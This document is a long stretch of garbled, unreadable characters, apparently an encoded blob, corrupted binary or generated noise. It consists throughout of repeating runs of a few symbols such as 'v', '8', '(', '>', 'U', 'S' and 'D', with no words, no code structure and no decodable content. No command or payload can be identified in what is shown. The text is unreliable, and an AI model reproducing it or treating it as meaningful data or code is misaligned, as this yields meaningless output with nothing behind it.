v8(>->v1(S4vD IvD8tvc4DUU1cv  r3G>rD1UUr8r8 t Sv 4r11>rr1->(S-I8t4S18>AUISrvrSUEO44>>>-UvSS-v-(148>rU4RUg8r81Rt8S  (r1cU8(rv1 tH>>tDcI t{ Dvt4S(v-z(I18DV1t-DSDE1>c8(S4U-tDrvDU(>I5SDSD->vDvU>c3(441w>r-1tUISS trI1> I> U>t83(>t4 S4IUSU8r{vI >}4c>D-1v8(t4v>8-8v8ut->vU(SrSvtU!v4(1r8DUUScv8vNOD4UIc>vrrS1vt U9vcr11DtUS-8v8(IRD4UU8>#tIS>c- cUh4r1DI-Uv-(v48D3Uvv18>4IDSUcc  (44I1U>-U8 rv18tNcr 1(41UtSU18 i(14t4S>8U_SIvDI-H84=1I>>U-Uvv(S 4>r-1v>- 4SDcU -? 441DrUUc> v/11x>{ S >rr1St4S 8!r411D8SU8DsvIt>H-F81(KD(>S-tv S>I4>I->vU(S4U&.U(v4(1vvDUU-cvv oxD4t(c> 1rS4/t - rUr1I(tU-D8vQ Imt4Uc8>}IIS>D- v N44 t(-UvD(vr-Dz-rv1(D4UD>I c8 n44I(U>ct SrU(9t(c4 1cv1Ut-Svc vc14>(S>81:S4t> tx1(71Ir>U-Dvv(I4L14U4v>(I4SDtU S((4:1DrUUcD vr-1HD8c181pU1St>S vrr411t>->vDkvIt>!-181m>IU1SUDv (-I4D8->c3(SrS1^U/cS(1r(DUUScv8vDSD4tcc>c8rS1vt - 8(r1IvtUU(8vM IjDBSI8>(8ISDU- vpd444D(-Uc (vrUDF-4v1 1rvDSt(c 8-44D1U>S>v8rvIatH-1 1r>1U>U- 8 lr14DrS>8U*S4SS1-Jv4{19U>U-Svv v>>>4UIv>8t4SDvU S Ic4111UUU  vr 19>)c4 >CD1S>US 8&r411t4SU8IYv4c>KS481p>Ir>S->v (^I4>I->S4 84vD-U!>U(14DDU>1cv S84DrU1c>U rS1ct UT-8r1IftUS>8vm-I^D4UI8D?4IS>>- ctn4441(-UvI(vr Db-4v18>rtDSUDc  -441vU>S>8vrv1>t%SW 1r>1U>U-U8 {t14t4S>8UWS4S>>-KvUe1rI>U-Svv( rI>4U8v>  4SDSU cS-i4I1MUUDM vr81Qtcc1 4vS1-tvS U>r41It>UU-D?vIU>5- 81LrIU1S1tv (SI4D ->-c(SrSDtU^cc(1((DUUScvv Y-D4t8c> rrSI-t UL8Ur1I(tUSI8v 1IAD4U(8>}rIS>D- vrY4r1DD-UvI(v4tDxU8v18>G.DSUDc  -444tU>cUUvrc1Ut#Sv 1O(1UDS>t8 GS14> S>c>5Sr>tr-.vv^1(I>U--vv8>4QD 1>vD(U4Sr-U c((4r%LUUtcS vv11=Urc181-c1St>S 81r411t>SU-I.cIU>lSr81WDIUDUtTv (SI41D->vU(SXvD>UOcc(144DUUDcvv rtD4t8c> rrSI t SH8 r1I tUSS8v, IBt4S48><rIS>D- vU94I1Dr-Uv1(v4vD7-rv1 1 (DSU>c  I44D1U>cU Drv1Ut&cr 1r11UDS-S8 yS14> S>81jSrvDD-;vv;14!>U-tvv(U4v>4U v>S>4SDcU c((4r+*UUtcS vvv1gUrc1 4vS1-tvS U>r41It>->D82vIU>+Sr81=>IU1SDtv (SI4D ->-((SP>v4UQcv(1vvDUU-cvvUr=1 I>cD UrS(4t S( 4(1YrtUS18voSImD8S1c>vIIS>>- vSs4rt>>t44 (v4UD{1(v1(D4U1UUvcSS44rD1U>tD Src1 tS-* 1r>1U>*Sv88waIxt1S4US2-Iv> ->84*II>>UI4vv( 4e>r-1v>(U4SDvU ca(4r D>UUcS vPB1XU4c1SDSI8>=8U -Scr84)-UUUUScvNEDS4v &>IU>SD-D(-4vv(c4(vU(14vD U.tDtc8U(tr8Dt  rtD4U1c>-DS>88+ Dv>cS( rCSSSv 2 IXt41(>>S18-(UI-trS(v((441>rU vtDFUcv1(>4U(I4t1SU-c8 ><WSU Srv1 > 1v IrD1Ut1Sv8 G.14>>S>8tjSIc> - 84 1r->U--vv(84CD7-1c> 84SDcU c((441D>t>SI vr81%t8c1 >rUIUtSS 8 r4I t>SU8Sfv4I>X-o81pDIU>U-vS ccI4>4->v>(S4-D U#>U(I4DDUUUcv 8r3I#> c> trS1Ut SC 4:4r_ttSU8vVUIJt4S18>!tIS>S- v(z4I4>>tUvU(v4vDuU;v1(14UISU4c   44D4U>ct Srv14tVcr 1r11Ut-Sv8 Mr14t1S>8tWSIv> -(84B1I>>UU8vv( 4k>4-Iv>(U4SD4UccZ(441D>UUcS v8 1Ctvc1 >rU}thS1-t(- 8(t>-c8SdvI 4v48>>-(8I(c4 U8-8c (c4tDS(S4>D Uiv4t(cU U4-D-UIr8D4U1c> UrS1vU tr 4} 1>tUSS-cScvv^-ID>U6UI->v- vC(-I1Dv-UvS(v U(trYD(SIvI Ur>D-t 441DU>cU ScU 8hvDr-4cr8c_cIUt-vcvvQ(IU>1;SI4> -B84v4v1((I>>D-- 4(8rX-1(Ur DvU c+-cvI 8r1t1t8Svm8rS1ctSc11SttS 8*r4(((s1I>v-UrD>&S481%>1>>S-vv (bI4>I->vU 84vD8U7v4(141DUUSc>  r D4U1c> >rSrvt4S)8Ar1I-tUS>8v8 IDt4S48>frIS>-- cG(SI1>D-Uv1(v4vDd>4c (>4tDSUSc  (4411tvcU Srv1UtLcr 1r>1>tSSc8 jQ14t1S>cU88Iv>8-H8rV14S>UUUv-( 48>4U-v>(U4SDvUUc;(r41DIUUcU v( 1cU4cI >rt1S>dS v (-11tISUv.XvI >_S4v-3>It>S--v ( I411U4vU(-4vD8U*c-(1r144U-c-  rcD4U1c> U(#1vtSSl 4r11>tUSSvUo I8t4-s8>3UIS>v-1v<urI1>>-Uv-(v4 11-4vI(>4UDSUcc  a3<D1U1cU Srv1vt2c48vr>1DtSSv8 % 1411 I8U#tIv>r-&v =1K>1o-Sv-( 4->4-rv> Ur1DvUvcR v41DIUUUSv(r 1 U4c4 >HZ1S>vSc8orr11>^SU8UyvI DDS484h>IU>S-vv 8=iD>1-1vU(U4vD4U?S; r4>D1UScr  rnD4U1-- UrU1vtSSN8ur14>>4SS8SL I t4-U8>(>It>v-Sv=(UI1>>-UvS -4 D -4cW(>4>DS>vc- }rGD1U1cU rrvIvoIc48^r>1ItSSv8 &V>Ut1Sr8Ue-Iv> -g848vI>>1-Svt( 4g>4-111(U4UDvU cG(r41D>rlcS vr 1(U4c1 >rU1StvS 8AXS11t>SU8S=DI >uS4U1-S8t^tItUD-vI4D+->vU(SvD(84ID8(144DUUScvttc( -odc> 4rS1vt >8tIS>8QN(1I8vu-I6t4S1>>SD8-(<I4vR  I1>>-UU-UtcS(rt4t_-rcD >rS1(ttp4u<rr1SUIct8(r4c488r>1UtS1Dt--v8cz(IU>4%tIv> D4cv8cPUUcDUcU( 4<>4U41-(U4SDvUccO(441D>c(cS vr 1(U4c4 >r4trtvS 8#((11tDSU8SgvIS44Sr81x>4D>S-cv   cD>1->vU(I4vD UQv44c4>DUUScc  r D4>1tr UrS1vt SX8 r14>IISS8v} IOt4- 8>#4DI>v- vP(tI1>D-Uv-(v4Sr4-rv1(>r8DSUcc  v81DIU>cU Srv18tH-3>tr>1UtSSS8 jL14D1>r8U}SIv> -=8rZ1#,vv-Svv( 4k>4-Iv> E4SDUI?c((441D>UUc- v!v8IU4c1 >rI1StvS 8 8S11tDSU8SLvI >jS4vUa>IU>S-Sv ((I4D<1Uvt(S4vD UYvr(14> ,UScv  r(D4U1c> Ur-1vt Sz84r11>tUSS8># I+t41Dttcc8-MI4Vvy( I1>>-U>I-cvr(c-4cU(>4UDSI-D-tv r8#r41>UrcS8-*v18 1Q81UtSSvt(cr(8b>1r>cSr8t(c-Kv8m1I>>U18D8-Svc(>-1c-(U4SDv1SDct(S{ 1r-1r-vSv rrD11t4rU1ttvS 8+v-8rIDSU8rXvI >P4c>D-1v8(t4v>8-8v8>1U{vU(S4v(Drk>rUcc1 DUSc>  rxD41r1St(cD8 dSSd8tr11>tU>Itt-S(8aSIc>SS1vUWt4)vf (I1>>-U>1-Icv(c44D4UtSO(rr(DDtvS- 1r11-t8Sv8St^S1 1r>1UI11I>oSv(v!cI1>D->(-w>It>>-9I>DI-Svv(  INrrvUD-Dc>(IrUD(t cc trSt>UISc8v4r1>UIcI1S>vS 8Wr4(vLrIct-- v(GtI U4-tv-(>1v>8U c >r->vU(S4vD 4>vSc1FIDUUScv8vU-D4U1c>8(rS1vt - 8-r11DtUSU8v+ IaD4U 8>HtIS>c- vUm4r1DD-Uv-(v48D,-rv18>:lDSUcc  (441JU>-U8 rv18tWcr 1/v1UDSSt8 K(14tIS>v8.SIv1>-e8r01I1>U-Svv( rD>4-1v>(U4SDSU cvS14ID>UU-S vr81z>4S1 >rI1StUS 8-r4I4SvSU8I9vI->FS481o>r(>S-tv (-I4>4->v44r4vD-UVS4(14DDUUScv S84DrU1c>vUrS1ct U284r11rtUS>8vPrI.DE8S8>orISD8- vb!4I118-UvD(v4tDeUdv1 f(vDSU>c 8-44DIU>cI SrU(=t(c4 1((1Ut-Svc (:14> S>8InS4(> U pU314 >U-1vv( 4_>4tcv>(44SD1U c (4r t8UUc1 v( 1GUrc1 >rU1>4 S88Cr441t>St8S v4 >.-c81(zIU>t-vcvUvI4Dc->cS(S4vD t c1(1rvDUtScv  raD4Urc> rrS14t S( 4w41rtUSI8v_4IQt4S18>(tIS>1- vSR4I1>>-Ucr(v4tD,U&v1(D4UD1tSc  6441SU>ct SrS1 tv>1 Ir>1U>!Sv88+;14wvS>8UjSIc> -_84H1I>>U-Svv(>49>4-1v>(I4SDvU 1/U(vI SrvcS Ur 1}U4I8UDS(8>tv-m82r4114I1I> St8c(vU4Ut-tvS(t4U>-U I4D ->vU(S - (44DvUcc(DUUIcv  rl cr(14UrcD8 _US{8gr11>tU1c-DG Itt4S18>vtvD(U4(S)cv8I(14cvS(44 Du-4U4USvt(t4r- S8S^ D7(Sr Srv1 > ID 1r>1UtUSv8 d^14ScS>8URSIc> - 84( 1(>U-Svv(-4X>r-1vD(U4>= U8cx(4r(D>UtcS Uv{1(U4c1vXrU1-tv-v>Ir411t>SI8SJvI >:8-81l>IU>--vvv(Jr4r(->vU(S4vD Uvv481 rDUUScv  rN1cU1SnLrrS1vt S1 4rI1>ttSS8UcdI(t4S1vS!UI->v-SU4!rI1>>-UvS(c4 1 rDv1(>4UD1Uvc  LZ4.(U>cU Srv1 t8c4c rD1UtSSvv8{B1rt1- 8Uh>  >8-<84(II>>t-SvUSe4(>4-1v>(U4-Dvtv1I(441D>UtcS vr 1SD-cI DrU1StvS88Rrr11t> p8SAvI >)S481A>IUD -vv (/45>1-DvU(>8 D8U:v4(14>DtUScvU>rRD4U1cD UrS1vt S( 4r11>1-SS8v0 IK>8S18>TU >nI4S>1-8I1D8-UvS(vct(rrPD-UIcU(-4-D- Cr(D1U>cUtvct8ttRS- 1r>1UI-It>SSr444 1D>>-8IvD -f84#1  (I48>cUovr(-4Tt1U-cc UI D(tLSOD>U>cS vr (vI4c18UrU1Stv>UttS18m4:I(>U--vS48IS>c-S81>S-Iv ()I4rtID>rUvvI SrcD U(4>D4UScv  88 Ir>19t(cI1vtSSZ 4r1(4rII4>Uy I-t4S18>cUv ec4D>cUnvr>ItD7pMt_(vUUI>1cU4DSDt SIv{(-8 -((- SrS1 t_c4UDv(1Ut>Sv8 3_8crII-tIbt14--U1c4cvmcc88Svv(D4P>4-1t -Iv- MrSDUS#vI 1UUcD vr 1LID1DU4cI8 t-(-84(t4118I4(Iv8I >tS481!>8-fcDtDb-cvD(cIrDD(t4vD U2v4(14>>U1cc- St8t,4DI8O1tUZ t S- 4r11>IIIvtcSv81^8I78IUcDSD8D 8>1YUS4U-Uvr(v4 DA1(Dv-Dc>(-4-1SUcS.D1U4cU Srv&rr(1-t>r>IZtSSv8 c;8ILrI8>1Srv8(l-884{1I>>U-Svv(  _>4U7v>(U4S D48Dtt 411vUUcS v8v 14rDrtc(U#txSI(>-r4I>t>SU8Sc-8-^1I8tr-4rUr848DVU8c ((41vD>1(tD-vA88I41rr-UScr  r<D4I8Drt18t 1rD11t S4 rWSSS8DJ IHt4I8tr-18I%t4,DS&44 >>-UvSc- U  IrDt-r4UDtUvc  G8- r1Dct Srv1-t_c4 1S> trrIS>ck8SDcJ-rIU(U8r48D?84(-I>>U-StAU(v8or4Ut>Uvv- I4-1  ((I11vvtctIISS v1cr >rU1StvS UZU !1t>S48SavI rr1IUtSDv((v-vvU(eI4>1DIDv-rvt krvv4 84>DUUS>>U-c88 rD11cDrS1Ut Sw 4vr88( 1D8-I(-.8r4Dr1Ur-D4vI#vQ_4I1D1=rvS(v4 IS-4v1(>r>1oUvc8 FrID1U>cUvS=81 t(c4 Ir>1>tSUvv=FQ1rt1SD8U8(Iv1 -D84LII>>t-ScU( NQDc-1vD(U4-Dv>4c3847UD>UtcS cr 4(U4c1c rU1-tvSv87r411t>U88SlvI >fS484L>I1rv-cv (&8t>1-DvU8SrvD Ucv4 n4>I1USSS41r<1cU1S1 UrS1vt -t 4Q(1>trSS8SR ISUcS18r%U4S>v-8vA?rI1>41Sv-(v4 1j-4vI(>41avUcc  AvtD1UDcUvSjv1 tcc48Kr>1rtS-Sr1JVIct1-D8U0SIv> Ut84((I>>r-SvS( 4SU--1vr(Uv(DvU8c2(441D4ISc- vr (DU4cI >(U)DtvS-8_A 11>DSUcSU-I >cS4v(b>r >Stvct(.48>1-rvU(-4vI t>v4 (4>DIUSc4  ? 1fU1S/ Ur11vt S2v3pI1>trSSc-y IJt4U1vtBUII>v-tve((I1D1UDvS(14 1)-4v1(>r>-1UvcD M(cD1U>cU8Urc1 t>c4cDr>1UtS-SvDsGItt1U>8U:SIvDv-v84(UI>10-Svv( r 1v-1c-(Ur8DvU cf85r1D>tScSvIr 1GU4S4v rUIctv--8_r411>18 8S(vI DSS481A>4>-L-vc8(:r(>1->vU UtDD t v4 U4>DUUSSS croI(U1-> UrS1vt -D 4;81>>DSS8vu I!>2S1v5jUIS>v-8vO8v4I>>-IvSSr4 D(-4S>(>41VvUcc  uvtD1UDcUvS8t1 tSc48=r>1ItSUvc8X(Ivt1-C8U8vIvDvUv84(8I>Ic-Svv( GWD!-1c((U4IDvUccQ8A4rD>tBcSvXr 1YU4S48>rU1rtv-48mr411>1U 8S/4I DcS481h>IU>r-vvt(74U>1-1vU(18SD8USv4--4>DtUScD  rv21UIc> Uc(1vt8S2v4v(1>t4SS8UH Ict4U1UrVUI1>v-Uv3 tI1D1UvvS(D4 Dr-4v1(>PU1DUvct zrcD1tccUvSl>1 t-c488r>rdtSUv84C3Ict1-(8U(rIv1 -S84(8I>>r-Svt( }E1c-1c((U4IDvtIcw(4v>DDU4cS >r 1-U4-1SrrU11tvSU8ORS111XtU8-o>I rDS48IJ>R >S-Ut<((I4>1IcvU(-4v1vrIv4  4>IcUScv  raWcUIS= Ur-1vt8SsvorI1>t4SS8>g I#t4U1v4}UII>v-SvO(8I11>-tvS(D4 D--4Sr(>4UDrUvc> +44D1U>cU Src1 t-c488r>IitSSv8U}VIvt1S18U0-IvDv>t84( I>1>-Svv( 431>-1cB(U4-DvUvc/84XSD>U4cS >r 1tU4-18-rU11tvSU8CP 11>WS48Sb>I r(S48I<>It>S-Utn((I4>11DvU(-4vDS14vr(14>(8UScc  _ 8DU1S, UOv1vt Spv4v(1>t4SS8>o 4rt4t 8D=UI1>v1UvlfrI11U-Uv>S 48D&-4> (>4tDSUU>u (44D14ccU -rv4 Icc48 r>11tS-c8  N(8t1-F8UM1IvDt-bSv_II>>4-Str( 4(>4>(v>(18vDcU cj-t41DDUUc>- r81QU4t4 >rt1St>-v8sr411>vSU8-%vIv>_- U>_DIU>S-4v ((I4>14 vU(S4vD8U;v4(14>DUUScv  ^8D4U1c> UrD1vt Sw-8-  rRSI>8v^UI&t4S1>r-SvSJcIc>D}44v>>-UvSUUc( 8r D4U8cS(IUvcU <44D1r1DttvcU8(rIc48Sr>1UtS>>tD- 884r1r>>-18t(v-PvD,1I>>UD>DtUYv-(84DDUctvt U4DDrU14rD>UUcS vr 1YU4t1 >r11StvS tIcrvEl SU8-^vI >?-U81(SIU>S-vtt-(v- M1CD-UU -(>4tD>UG4>D4UScv  8( (}718t-Sv1vt8SL 4r1I8tU-c8vs IE, 1I>4St UTtIr>rU v(4r44>DU cSD8-4v1(>4UDSUvv cr441(U>cU Sv-8Sr(I+>Wr>1rtSSv8 vvv89>I(tI-cv >c-e84H1I> Sr>- c848>4-1v>(U4S(4->t7(4rSD>UUcSSSSv tr 18UrvS DPUtvS r411t>->D8_vI >l-(81n>IUDUr(v ((I4Dv->vU(S?vr-UQvr(14DDUU>cv8vD>D4U4c>8>rS1vt - rUr11ItU--8v3 IVt4 t8>ntIS>-- v_X4I14D-tvS(v4 D?Uev1(>j>D-Ucc  #44DIU>cUvUrc1vtCc4 1r11UtSUS88Y814t1S>8DBS4v(v-Av(u14>>U-Svvv >8>4-rv>(t4SD>U Ud 441DIUUS( v:(1{t4-  >r>1S> S 88r4r1>(SU8UhvIt>&--81(>4S>S-cv (4I4>4->vU t4vDvU2v4(14>DU>SU(  r D4U4c>8 rSIS>(S%8 r1IItUSS8vz 4tt4S48>^1IS>S- SY 8I1>1-UvU(v41D)tmSU(>41DSt(c  Q44D1trcU Urv1StQS, 1(>4HtSSS8 0 14>(S>v>81Ic>S-nv0d1I>>U-Sv>( 4c>4-Iv>(U4SDvUvcA  41DrUUcS vr 18U4c4 >rU1StcS 8{L(11t1SU8SkvI8>*S4v1H>ID>S-vv ( I4>1UcvU(>4vD Uac((1r> >UScU  ?JD4U1c>cUDt1vtSSe rr1I.tUtSvcW Ivt4--8>(-ISDv->vP((I1DU-Uv>(v( 1U-4vr(>4rDStQc 8%K8D1U1cU8vrv1ct.c48 r>1DtSSv8 .G14D1t-8U_tIv>c-ZvUN1411 -Svt( r8>4-1v>(Ur4DvUcc} 841D1UU-S81r 18U4cr >} 1S>SS882j811>-SU8SavI >1S48rM>II>S-Sv 8grU>1-IvU(t4vD-UxSCtt4>DIUScS  r9D4U18v Ur11vtvSV 4r11>1sSS8tK ISt4S18>nUcU>v-cvTN4I1>D-UvS-14 Db-4vI(>4UDSUvc  j44D1tNcU Srv1 tSc4 1r>(c6rD t8SI88t1-U8U%SIvr-4C> SIv4KIIct---cv  4cDU-r4SDIU cW(48r 4r-1S-USt cr81> >*I1StvS -(-8v;ZtUU-1ScvvWIU4t- > SZDIcDv-cc( 5t>>c(S4DD U&v4U8vr 14IDttdSSD4t c> UrSB-#(14tvSc8(>USS8v2 4 ZvSI8DpUID>v- vCh4Ir>>-tvS(c4 D -4S18(4UD-Uvc8 ZrvD1t>S1 Src1 tvc4 1r>I>trSv88TpITt1S>8U(UI4> - 84((I>>U-Svv D4=D!-1vD(U4UDv> tc(444D>U>cS cr 1l4UcI DrU1UtvS88*(QIIt>St8S7-I >gS4v48FIt>U-vv-(zI4>1->Sv(S4SD U(v4(44>IUt cv vr21JU1S{ U(S1ct S  4r41>t1SS8v( IhtrS181xUI->v- v1A4I1>>-tvS(v4 D(-4v1(>4UD4Uvc  b441SU>cU S8- 8r4>(tDSS8vrr1Ut-a7I8t1S>8U-S8c=D4 D(?14 >U-Svvcvv( (4(t>-tcU UU ct(441D>1DD4UcSv (r(IAUrS>1StrS 8fr4(Unt1Dt--Z  Z11rDcSrv>>--vv (4I4>1->Ur-DcUrS4c1(-rvr S4>DctbSv8(U1cI UrS1vIDI8Sr( 1>tUSS8vS)IOt4S18>_UIS>v- :t74I1>>-tvS(S4 DSc-v1(>4U1DUvc8 F44D1U4>S -rv1 >cc4 Ir>I>(8Sv8 AoIBt1S>8UVS8 > -(84VII>>U-SSvc-4e>r-1vD(U4DDv> tc(44ID>UtcS Ur 4lt4c1 DrU1-tvSt8xr4rvt>St8SxSI >TS481 cIU>S-vv (T4f>1-4tS(-4vD t8v4(I4>IUtScv -ry1 U1S  U0UU4t S- 4rr1>tUSS8v(DI^>8S1v(gUIU>v-U -F44(>>U>vS(c4 D(-4cfSU4tDSUvSv #4rD1U4>S -rv1 >8c4 Ir>rUI Sc8SKZ1rt1-R8U_14S> -G84(UI>>t-SvS( 4vr1-Iv>(Ur DvU8cn(4cvD>UUcS cr 1FU4c1 >rU1StvS>8gr411t>S48S5vI 48II>>-hv(^I-vvS(_I4>1r(>t-rcUD U-v4(14>(r4D1UUtcc 1b c>8UrS1vt >(>8-<8tDU>1tc-v8ID4>4>t-Dvt,t4cvd(rI1>>-UU-UtcS(rt4t -Dc> 8>vtStcc1 84r1-tvrvI-t7c4 18D8IB>I8c vS r<4I-cUS(rvrNIctr-48r(D4>SvSr4lD8-1v>(UcS(-48D1U>4118UUcS v888c* 1Dv>84 -OS1rcvr411t>->D8nvI >y-/81w>IU>S8Iv (OI4>I->v>(S4>ttUAv4(14rDUU-cv 8rF1 I>cD UrS1tt S( 4H{(UttSS8v cIEtrS1v1UcIS>v- v854I1>>-UJr(v4 D,-rv1(14UIS1tc  i44D1U>ct S(vs-twc4 1r>1Ut4Sv8UIt14t1S>vvdSIc> -784(= U>t-Svv(44u>r-1v4SS4-DvU Sr(44ID>t>I8 vr 1wt(c1 >rU1ScIS 8Fr41It>S>8S v(->FS481w>IU>--vS ccI4>1->vU(S4UD US -(14>DUttcv 8rzD4U1c4-Sr-1vt -8 4rI1>t1Dv8ci I_DIS18DNU4U (- vFV4Ir>>-UvS(v>DDF-4v1(D4UDUUv- Sc44D1U>cU Src1 D_>8 1r>1UtSSv8UCeIvU8S>8U6Sr8> -(84?II>>11vvc( 4!1I-1vD(UrU8(U cf(44rD>UUcS vDD1wU4c1 DrU1UtvU -cr411t>SU8SCcI 1TD881B>IU>S-vv-(_4vUc->vU(S4vD U(v4(14>D1Ivcc  rED4U1cD UsUv(t Sm 4;81>tUSS8S8>IytrS18>^UIS>v- v1H4I1>>->vS(c4 Dv11vI(>4UDSUvc8 C44 vU>cU Src1 tZc4 1rD1UtSSvvrx_14t1S>8rmSIv> 1%>>SIc8KI4UD-(cIr Ic1U(t(>trc1ccM 841D>UU>8t8cS cr>c18 rU1StvD tr-(8c^4I(>c- I >SS481a>(D( II>--4c >1U8vU(S4v((Irt8U>vr c4rDttcr}1 U1c> UcI crr1c 4{11>tUSS-1--8IrrI>>t-(8>rS4(>rU  1,D4>D>(-4 Dj-4v1(>4U4>1vc  (44D1U>U> SrI1 t=c4SrS  tzU1ctc-v88}4S>81)SIv> 18>-US8r>U-1vv( 49rS4cD4->cc 1U cc(441D>rUD-UISv88U4cI >rU1S1cS 88r411t>IStD-DI >-S481G> 4xDI-DS-rc2Ir->vt(S4vD D8v4 -4>DUUStDU-Sv,(rv18tvc>8Sr-14 4p>1>tUSS->SD84N D >8->vt(UDc>U--vUW4-Uvr(v4 D?rcDDU1c8 trvD8U8c8D1tccU Srvi4rr1(UISS(U& 1c>DScv.t1-88UoSIv4rI(>c->v8(14D>U--4G>r-1v>(U(>DvUcc<(44138rDt- vrD12U4c1- cI -:bIStUv< I?1SU81fvI >p1ItDc-8t5r4 v ((I4>1->-I(S4>D UPv4Srvr >r1Dttv>ID4U1c>8>UI1vt S%81r11>tU-U81^ I(t4-88>JUIS1v-4vMZrI1>D-UcD(vG 1(-4vI(>4tDStrc v,rUD1UDcU -rv1UtO-4vcr>1ttSSc8 uc14D1U88U3-Iv>8-pc(l1I>IZ-Svc( 4 >4-1v>(UC(DvU cu(441D1UUc>- r812U4-U >rt1SDv- 8,5811t4SUvrbv4vS>S4v8{>ID>S-vv (/r->1-rvU(I4vDvUucvrc4>DIUS-s  r(D4U1c> 1vv1ct S:v>r11DtUUSvv< Ict4-k8>(1ISDS81v*(cI11v-UvS(v4 1t-4c((>4rDSUSc  S1-D1UrcUv rv18t:c4 1r4(St-Sv8 (114tIS>cUvDIv>--,v w14->UUUc(( 4S>4UIv>(U4SIvtvc/ v411nUUSS vsvIDU4S8 >P(1StvS v o(11> SU8rEvI >uUMvrw>4(>S-Iv (FI4>1t vU(14vDDU)cR(1r>1DUSct  r1D4t c> 42U1vt SJ8Ur11DtUSU8v!S(4trS18>( IS>c- c UDI1>>-Ucv(v4 D/tm4a(>4tDSUDc  l44I1t cU -rv18t{-8 1(>IUtSSc8 +(14D-S>cU(>Iv>8-k8r/14y>UtSc-( 4(>4-Iv>8c4SIvUccB(r41DDUUSc v( IcU4cI >rt1S>-S 8X S11tDSU8UTvI >GS4c-+>IU>S-vv ( I4Dm1Uvt(S4v44UMvr(1;>rIUSct  rvD4tKc>8>5l1vtUS&8cr11>tUUS84{ ISt4- 8>wtIS1vUUvY(vI1D_-Uc1(v* 1D-4c (>44DSUrc vhrUD1t<cU 1rv1>t+-4 rr>14tSS>8 6v14t1--8UnDIv>--yvv!1r>4I-Svt( 4c>4t8v>8448DvU-cjc841DDUUcU vrSe4Urc1 > I1StcS 8vv11It>SU- )vI8>JU^Dt5>II>SUcv (zI411t1vU(D4vD-UAc4(1r1DIUSc>  rtD4U1c>8>H11vttSi8-r11>tU-U8t) IUt4-c8>KUIS>vU:vH(8I1D -UvU(vr D--4c<(>rvDSUtc  S_*D1U>cUvrrv18t=S# 1r4(St-Sv8  t14tIS>v>U8Iv> -,v1z1I>>UUUIU( 4(>4U8v>(U4SIvUtc.(r41DDUUSD v( IcU4cI >rt1S>rS c{f411tDSU8-=vIU>OU4v43>It>S-cv  II411t vU(-4vD8ULcU(1f>I UScc  r(D4trc> U(41vt8S387r11>tUSSvrs IPt4S18>M>IS>U1xv(C4I1Hc-Uv-(vu rc-4c((>41DSUUc 8 rUD1tkcU Irv1 tO-48vr>14tSS>8 _(14D1- 8UA1Iv>U-jcv?1r>D -Sv>( 4S>4U-v>8UrSDvUUcf v411 UU-S -r 1SU4S  >r11Stv- 8<!811trSU81avr 4cS4v(a>II>SUDv 8Sk4>I-rvU-(4vD8U{cl(144RSU-cv  vDD4UIc>8>-81vt-Si8rr11>tUUScSW Ict4-(8>(UISDS-Ivd(vI1D8-UvS(vrv1--4c8(>r(DSUvc 8 lcD1t cU rrv1 tJc4v(r>1ItSS18 M 14>1U(8Uf>Iv>4-0v8&14aD>-Svv(  t>4-Iv>(>4SDUILc((44198UUc- vLv8IU4c1 >3S1StvS v t 11tDSU8IgvI >lU4ccf>It>S-cv  cI411UtvU(-4vD8UuSt(1_>14UScc  r(D4t c>vUX(1vt8SE rr14-tUUSv>h I(t4SI8>(>IS1v-rv_MrI1>D-Uct(v4 IU-4vI(>4>DSUvc  i;tD1U>cU Srv1vt{S ->rD1UtSI48 ?(14D1>r8U_DIv>S-lv 5141D -Sv>( 4->4-1v>8Uy8DvUUc_ v41DDUU-S Ur 1SU4S  >=41SDv-r8xdv11>6SUv(Rvr D S4v 2>I4>S-1v 8ErS>1U.vU(14vDSUYv48c4>DIUSct  rSD4>1tr UrD1vt-S{vcr1rd1US-8tM v>t4SI8>C>IS>U1!v({4I1 v-Uv-(vrv I-4c((>rtDSUvc vY(wD1UrcU DrvI t3-78(r>14tSSI8 oG14>4U28U{IIv>D-N84G141D3-Sv1( 4t>4-1v>(UrIDvU-cJ S41D1UUSS Dr 1vU4SU >rI1St>-v8&r411K SU8-dvIv>A- U>gDIU>SI1v ((I4D4r-vU(S4v1mUkv4(1r1v1UScc  r-D4U1c>vUrU1vt8SB rr1IrtUUSv4B I(t4SI8> 8IS1v-tv:urI1>D-Uv1(v) D(-4vI(>4tDS>(c vyfvD1UDcU -rvI>tB-48-r>1ttSSc8 (814t1t 8U.-Iv>v-x84E1I>18-Svv( 4;>4-4v>(18vDcU cLDU41DDUU-SStr 1cU4Sh >r11S>SS180hv11>(SU8SZvr DcS4v i>I4>S-cv 8:4.>1UfvU(14v1UU/S48 4>D4USc>  rDD4>1cD Ur11vtUSR8Sr14>DvSS8>F ISt4-O8>QU4 >v--vT(8I1DX-USSct4 Dc-4c((>rrDS>>vr Qr8D1(IcU -rv1vtpS ->rD1UtSr-8 d(14>2DU8tsSIv81-W8r7141 c-Svt( r(>4-1v>8UkUDvU-cP 8411>UUSU 4r 1SU4Sc >rU1S>SSv8,lc11>8SU8S.v4v>DS4vv}>4(>S-vv (}rv>1-rvU(44vDvU7c48(4>D1USSJ  rcD4t S1 UrS1v(tSg rr111tUS>U G8ILt4r88>stISDS4rv%f4I1DU-UvS(vrvvv-4vI(>4rDSUvc vVr-D1UDcU -rvI-tE-48-r>1ttSSc8 (D14D1S48Uf-Iv>8-Rvv<1r>1c-Svc( 4(>4ttv>8U4DDvU8c=(r41ISUU-S Sr 1(U4cI >jD1StvU>8mrr11t1SU8SVvI DDS481W>IU>S-Sv (v 1>I->vUIV4vD8UXS4S(4>DIUScU  rvD4t4Sv Ur11vttSf 4r14>trSS8>^ ISt4SI8> UID>v-Uv6(vI11Q-USS8N4 DS-4c (>r8DS>vcI 9rvD1ticU 4rv4 t(c48 r>14tSSU8 +!4St1Sr8UVDIv>U-,c4c(I>>I-Svt( r->4> v-(U4DDv8cc3(r41D1UUc>- r815U4mr >rt1StUD!8(r411cvSU8-}v4v(IS4v(z>4t>S-vv 8{}i>1-rvU(D4v1 U)Se(r4>D4UScI  rLD4t4-c UrI1vtDS= 4r1I1>cSS81? Itt4S18>_UIt>v--vY(SI1>1-UcS(S4 Dv-4cU(>4IDSU>Sv j44D18(cU -rv1vt;S ->rD1UtSeD8 d(14t1I 8U+SIv>8-d84h1I>>U-Svv( 4U>4-1v>(U4>DvU cZUcvI -4IcS tr 1sU411UIct8 O=S v(r411t>>t>D-Uv(1}DvtI-1vc1SDUD--4vc((4tDS(S4UD UWv4t8vD (r>c-  ru21> U8cSI8KSt SS 4r11>IDIc> SU8t0cS1v(TUIS>v1 >1Sr8rhr1(>>(v4tDm-4v1U(vI 